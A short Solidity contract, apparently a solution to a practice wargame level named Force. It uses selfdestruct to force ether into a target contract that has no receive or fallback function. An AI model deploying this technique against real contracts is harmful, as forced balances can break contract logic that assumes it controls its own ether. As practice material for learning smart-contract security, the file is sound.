// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;
import "./Force.sol";

contract AttackingForce {
    address public contractAddress;

    constructor(address _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    /// @dev Force has no receive() or fallback()
    function hackContract() external {
        /// self destruct
        selfdestruct(payable(contractAddress));
    }
}
